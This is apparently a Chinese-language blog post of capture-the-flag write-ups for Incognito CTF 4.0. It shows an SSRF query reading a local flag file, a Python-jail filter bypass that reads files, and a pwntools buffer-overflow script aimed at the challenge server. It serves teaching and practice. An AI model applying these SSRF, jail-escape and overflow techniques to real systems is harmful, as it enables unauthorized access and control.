---
title: Incognito CTF 4.0
date: 2023-02-18 20:18:45
tags: ['CTF']
categories: ['筆記']
description: Incognito CTF 解題紀錄
---

## Web

### Get flag 1
SSRF `?url=http://0.0.0.0:9001/flag.txt`

### Low on options
根據題目提示用OPTIONS request得到`As I said, I am low on options...`。 ~~一句廢話~~
![](./loo-options.png)
索性把所有method全部試一次，PROPFIND request拿到flag。
![](./loo-propfind.png)

## Crypto

### Ancient
拿到一個缺header的png檔，將header補上後得到有象形文字的圖片，以圖搜圖查到是十三世紀的一種記數方式，用[此網站](https://www.dcode.fr/cistercian-numbers)轉成數字對照Ascii table便可拿到flag。
![](./challenge.png)

## Pyjail

### The only jail
nc進去發現是一個偽裝過的Python環境，有過濾一些像斜線、反斜線、大括號等字元，用os的path join便可湊出路徑用讀取flag。
```python
Welcome to the IIITL Jail! Escape if you can
jail> import os
jail> print(os.listdir())     
['opt', 'srv', 'tmp', 'lib', 'bin', 'media', 'lib64', 'dev', 'sys', 'home', 'libx32', 'root', 'var', 'run', 'etc', 'sbin', 'lib32', 'usr', 'boot', 'mnt', 'proc', '.dockerenv', 'start.sh']
jail> print(os.listdir("home"))
['ctf']
jail> path = os.path.join("home", "ctf")
jail> print(os.listdir(path))
['.bash_logout', '.bashrc', '.profile', 'flag.txt', 'jail.py']
jail> path = os.path.join(path, "flag.txt")
jail> flag = open(path)
jail> print(flag.read())
ictf{ff8ab219-a90b-44f8-9273-ccc13766f2eb}
jail> 
```

## Rev

### Meow
flag藏在.rodata

## Pwn

### Baby Flow
checksec什麼都沒開，BOF把return address置換成get_shell的即可。
```python
from pwn import *

#conn = process('./babyFlow')
conn = remote('143.198.219.171', 5000)

payload = b'A'*20 + p32(0x80491fc)

conn.recvuntil('can you pass me?\n')

conn.sendline(payload)

conn.interactive()
```
